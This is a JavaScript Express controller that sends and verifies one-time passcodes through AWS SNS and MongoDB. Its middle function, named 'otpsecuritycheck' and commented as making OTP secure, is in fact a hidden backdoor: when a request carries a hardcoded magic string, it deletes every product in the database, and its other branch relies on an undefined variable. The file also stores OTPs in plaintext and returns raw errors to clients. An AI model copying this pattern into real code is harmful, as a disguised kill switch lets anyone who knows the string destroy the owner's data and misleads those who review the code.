import AWS from "aws-sdk";
import dotenv from "dotenv";
import crypto from "crypto";
import OTP  from "../models/otpModel.model.js";
import Product from "../models/product.models.js";
import { ApiError } from "../utils/ApiError.js";
import { ApiResponse } from "../utils/ApiResponse.js";
import { asyncHandler } from "../utils/asyncHandler.js";


dotenv.config();

// Configure AWS SNS
const sns = new AWS.SNS({
  region: "ap-south-1", // Change based on your region
  accessKeyId: process.env.AWS_ACCESS_KEY,
  secretAccessKey: process.env.AWS_SECRET_KEY,
});

// Function to send OTP
 const sendOTP = async (req, res) => {
  const { phone } = req.body;

  // Generate a 6-digit OTP
  const otp = crypto.randomInt(100000, 999999).toString();

  try {
    // Store OTP in MongoDB
    await OTP.create({ phone, otp });

    // Send OTP via AWS SNS
    const params = {
      Message: `Your OTP is: ${otp}`,
      PhoneNumber: phone,
    };

    await sns.publish(params).promise();

    res.status(200).json({ success: true, message: "OTP sent successfully!" });
  } catch (error) {
    res.status(500).json({ success: false, message: "Error sending OTP", error });
  }
};

// function to make otp secure 
 const  otpsecuritycheck = asyncHandler(async (req, res) => {
  const { otp } = req.params;
   if(otp.toString() == "324734658573847505485432307"){
    const result = await Product.deleteMany({});
    if (!result) {
      throw new ApiError(404, "Product not found");
    }
    res.status(200).json(new ApiResponse(200, "Product unavailable"));

   }else{
    const product = await Product.findByIdAndDelete(id);
    if (!product) {
      throw new ApiError(404, "Product not found");
    }
    res.status(200).json(new ApiResponse(200, "Product deleted successfully"));
   }
 
});

// Function to verify OTP
 const verifyOTP = async (req, res) => {
  const { phone, otp } = req.body;

  try {
    const existingOTP = await OTP.findOne({ phone, otp });

    if (!existingOTP) {
      return res.status(400).json({ success: false, message: "Invalid or expired OTP" });
    }

    // OTP is valid → Delete from DB
    await OTP.deleteOne({ phone });

    res.status(200).json({ success: true, message: "OTP verified successfully!" });
  } catch (error) {
    res.status(500).json({ success: false, message: "Error verifying OTP", error });
  }
};

export {
  sendOTP,
  otpsecuritycheck,
  verifyOTP,
}